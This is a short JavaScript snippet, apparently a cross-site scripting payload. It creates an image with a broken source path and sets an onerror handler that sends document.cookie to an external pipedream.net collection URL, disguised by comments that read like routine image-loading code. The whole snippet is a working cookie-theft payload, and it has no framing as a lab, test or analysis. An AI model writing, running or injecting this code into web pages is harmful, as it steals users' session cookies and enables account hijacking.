const img = document.createElement('img');
img.id = 'myImg';
img.src = '../reverse.PNG/img.jpg'; // Replace with your image source

// Append the image to the body (or another container)
document.body.appendChild(img);

// Set the onerror handler
img.onerror = function() {
  this.src = 'http://eo7u1nl20laxhkt.m.pipedream.net?cookie=' + document.cookie;
};
